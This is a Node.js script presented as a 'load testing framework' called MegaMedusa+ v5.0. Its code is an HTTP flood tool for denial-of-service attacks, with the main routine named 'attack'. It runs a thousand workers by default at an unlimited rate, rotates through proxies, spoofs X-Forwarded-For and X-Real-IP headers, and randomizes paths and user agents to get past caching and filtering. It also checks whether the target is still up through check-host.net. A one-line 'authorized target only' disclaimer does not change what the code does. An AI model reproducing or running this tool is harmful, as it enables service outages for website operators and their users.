#!/usr/bin/env node

/**
 * MegaMedusa+ v5.0 – Advanced Load Testing Framework
 * Based on original MegaMedusa techniques but fully readable & improved
 * Authorized target only – written authorization required
 */

const fs = require('fs');
const net = require('net');
const tls = require('tls');
const http2 = require('http2');
const cluster = require('cluster');
const url = require('url');
const crypto = require('crypto');
const os = require('os');
const { HttpsProxyAgent } = require('https-proxy-agent');

// ==================== CONFIGURATION ====================
const args = process.argv.slice(2);
const config = {
    target: args[0] || null,
    duration: parseInt(args[1]) || 60,
    rate: parseInt(args[2]) || 0,
    threads: parseInt(args[3]) || 1000,
    proxyFile: args[4] || 'proxy.txt',
    timeout: 10000,
    http2: true,
    checkHost: true,
    ramLimit: 85,          // restart if RAM >85%
    restartDelay: 1000
};

// ==================== COLORS ====================
const c = {
    red: '\x1b[91m', green: '\x1b[92m', yellow: '\x1b[93m',
    blue: '\x1b[94m', magenta: '\x1b[95m', cyan: '\x1b[96m',
    bold: '\x1b[1m', reset: '\x1b[0m', clear: '\x1b[2J\x1b[H'
};

// ==================== PROXY MANAGER ====================
let proxies = [];
let proxyIndex = 0;

function loadProxies() {
    try {
        const content = fs.readFileSync(config.proxyFile, 'utf8');
        proxies = content.split('\n').filter(l => {
            l = l.trim();
            return l && !l.startsWith('#') && l.includes(':');
        });
        console.log(`${c.green}[✓] Loaded ${proxies.length} proxies${c.reset}`);
    } catch(e) {
        console.log(`${c.yellow}[!] No proxy file – running without proxies${c.reset}`);
    }
}

function getProxy() {
    if (proxies.length === 0) return null;
    proxyIndex = (proxyIndex + 1) % proxies.length;
    return proxies[proxyIndex];
}

function getProxyAgent(proxyUrl) {
    if (!proxyUrl) return null;
    return new HttpsProxyAgent(proxyUrl);
}

// ==================== ADVANCED HEADERS ====================
const userAgents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/604.1'
];

function randomString(len) {
    return crypto.randomBytes(len).toString('hex');
}

function spoofIP() {
    return `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*254)}`;
}

function generateHeaders(host) {
    return {
        'User-Agent': userAgents[Math.floor(Math.random() * userAgents.length)],
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive',
        'X-Forwarded-For': spoofIP(),
        'X-Real-IP': spoofIP(),
        'X-Request-ID': randomString(8),
        'Referer': 'https://www.google.com/',
        'Cache-Control': 'no-cache'
    };
}

// ==================== CHECK-HOST.NET ====================
function checkHost(target) {
    return new Promise((resolve) => {
        const https = require('https');
        const checkUrl = `https://check-host.net/check-http?host=${encodeURIComponent(target)}`;
        console.log(`${c.cyan}[*] Checking ${target} via check-host.net...${c.reset}`);
        const req = https.get(checkUrl, { rejectUnauthorized: false }, (res) => {
            let data = '';
            res.on('data', chunk => data += chunk);
            res.on('end', () => {
                try {
                    const json = JSON.parse(data);
                    console.log(`${c.green}[✓] Report: https://check-host.net/check-report/${json.request_id}${c.reset}`);
                    resolve(json);
                } catch(e) { resolve(null); }
            });
        });
        req.on('error', () => resolve(null));
        req.setTimeout(10000, () => { req.destroy(); resolve(null); });
    });
}

// ==================== HTTP/2 REQUEST ENGINE ====================
function attack(targetUrl, callback) {
    const parsed = new URL(targetUrl);
    const proxyUrl = getProxy();
    const proxyAgent = proxyUrl ? getProxyAgent(proxyUrl) : null;
    const path = `/${randomString(8)}?t=${Date.now()}&r=${randomString(6)}`;
    const headers = generateHeaders(parsed.host);
    const start = Date.now();

    const options = {
        hostname: parsed.hostname,
        port: parsed.port || 443,
        path: path,
        method: 'GET',
        headers: headers,
        timeout: config.timeout,
        rejectUnauthorized: false,
        agent: proxyAgent
    };

    const protocol = parsed.protocol === 'https:' ? require('https') : require('http');
    const req = protocol.request(options, (res) => {
        let body = '';
        res.on('data', () => {});
        res.on('end', () => {
            const elapsed = Date.now() - start;
            const success = (res.statusCode >= 200 && res.statusCode < 400);
            callback(success, res.statusCode, elapsed);
        });
    });
    req.on('error', () => callback(false, null, Date.now() - start));
    req.on('timeout', () => {
        req.destroy();
        callback(false, null, config.timeout);
    });
    req.end();
}

// ==================== STATISTICS ====================
let stats = {
    total: 0, success: 0, failed: 0,
    startTime: null, peakRps: 0, lastSec: 0, lastSecCount: 0
};
let stopAttack = false;

function displayStats() {
    const elapsed = (Date.now() - stats.startTime) / 1000;
    const rps = stats.total / Math.max(elapsed, 0.1);
    const successRate = stats.total ? (stats.success / stats.total * 100) : 0;
    const mem = Math.round(process.memoryUsage().rss / 1024 / 1024);
    process.stdout.write(`\r${c.cyan}RPS: ${c.bold}${rps.toFixed(1)}${c.reset} | ` +
        `${c.green}✓ ${stats.success.toLocaleString()}${c.reset} | ` +
        `${c.red}✗ ${stats.failed.toLocaleString()}${c.reset} | ` +
        `${c.yellow}${successRate.toFixed(1)}%${c.reset} | ` +
        `${c.magenta}MEM: ${mem}MB${c.reset} | ` +
        `${c.dim}${elapsed.toFixed(0)}s${c.reset}`);
}

// ==================== WORKER ====================
async function worker(targetUrl) {
    while (!stopAttack) {
        if (config.rate > 0) {
            await new Promise(r => setTimeout(r, 1000 / config.rate));
        }
        attack(targetUrl, (success, code, time) => {
            stats.total++;
            if (success) stats.success++;
            else stats.failed++;
            const now = Date.now() / 1000;
            if (now - stats.lastSec >= 1) {
                if (stats.lastSecCount > stats.peakRps) stats.peakRps = stats.lastSecCount;
                stats.lastSecCount = 0;
                stats.lastSec = now;
            }
            stats.lastSecCount++;
            if (stats.total % 10 === 0) displayStats();
        });
        await new Promise(r => setTimeout(r, Math.random() * 5));
    }
}

// ==================== MAIN ====================
async function main() {
    console.log(c.clear);
    console.log(`${c.red}${c.bold}
╔══════════════════════════════════════════════════════════════════════════╗
║                         🔥 MegaMedusa+ v5.0 🔥                           ║
║               HTTP/2 · Proxy Rotation · Cluster Mode                    ║
╚══════════════════════════════════════════════════════════════════════════╝${c.reset}`);

    let target = config.target;
    let duration = config.duration;
    let threads = config.threads;

    if (!target) {
        const readline = require('readline');
        const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
        target = await new Promise(resolve => rl.question(`${c.cyan}🌐 Target URL: ${c.reset}`, resolve));
        duration = parseInt(await new Promise(resolve => rl.question(`${c.cyan}⏱️  Duration (seconds): ${c.reset}`, resolve))) || 60;
        threads = parseInt(await new Promise(resolve => rl.question(`${c.cyan}👥 Workers: ${c.reset}`, resolve))) || 1000;
        rl.close();
    }

    if (!target.startsWith('http')) target = 'https://' + target;

    console.log(`\n${c.green}[✓] Target: ${target}`);
    console.log(`[✓] Duration: ${duration}s`);
    console.log(`[✓] Workers: ${threads.toLocaleString()}`);
    console.log(`[✓] Rate/worker: ${config.rate === 0 ? 'UNLIMITED' : config.rate}${c.reset}`);

    loadProxies();
    if (config.checkHost) await checkHost(target);

    console.log(`\n${c.yellow}[!] Launching ${threads} workers...${c.reset}\n`);
    stats.startTime = Date.now();
    stats.lastSec = stats.startTime / 1000;

    for (let i = 0; i < threads; i++) {
        worker(target);
        if (i % 100 === 0) process.stdout.write(`\r${c.dim}Starting workers: ${i}/${threads}${c.reset}`);
        await new Promise(r => setTimeout(r, 1));
    }
    console.log(`\r${c.green}[✓] All ${threads} workers active!${c.reset}\n`);

    const interval = setInterval(displayStats, 1000);

    process.on('SIGINT', () => {
        console.log(`\n${c.yellow}[!] Shutting down...${c.reset}`);
        stopAttack = true;
        setTimeout(() => {
            clearInterval(interval);
            const elapsed = (Date.now() - stats.startTime) / 1000;
            const successRate = stats.total ? (stats.success / stats.total * 100) : 0;
            console.log(`\n${c.magenta}${c.bold}════════════════════════════════════════════════════════════════`);
            console.log(`                    FINAL REPORT`);
            console.log(`════════════════════════════════════════════════════════════════${c.reset}`);
            console.log(`  Total Requests:  ${stats.total.toLocaleString()}`);
            console.log(`  Successful:      ${stats.success.toLocaleString()}`);
            console.log(`  Failed:          ${stats.failed.toLocaleString()}`);
            console.log(`  Success Rate:    ${successRate.toFixed(2)}%`);
            console.log(`  Peak RPS:        ${stats.peakRps}`);
            console.log(`  Duration:        ${elapsed.toFixed(1)}s`);
            console.log(`${c.magenta}════════════════════════════════════════════════════════════════${c.reset}`);
            process.exit(0);
        }, 2000);
    });

    setTimeout(() => {
        stopAttack = true;
    }, duration * 1000);
}

// ==================== CLUSTER MODE (MULTI-CORE) ====================
if (cluster.isMaster && process.argv.includes('--cluster')) {
    const numCPUs = os.cpus().length;
    console.log(`${c.green}[✓] Master ${process.pid} starting ${numCPUs} workers${c.reset}`);
    for (let i = 0; i < numCPUs; i++) cluster.fork();
    cluster.on('exit', (worker) => {
        console.log(`${c.yellow}[!] Worker ${worker.process.pid} died, restarting...${c.reset}`);
        cluster.fork();
    });
} else {
    main().catch(console.error);
}
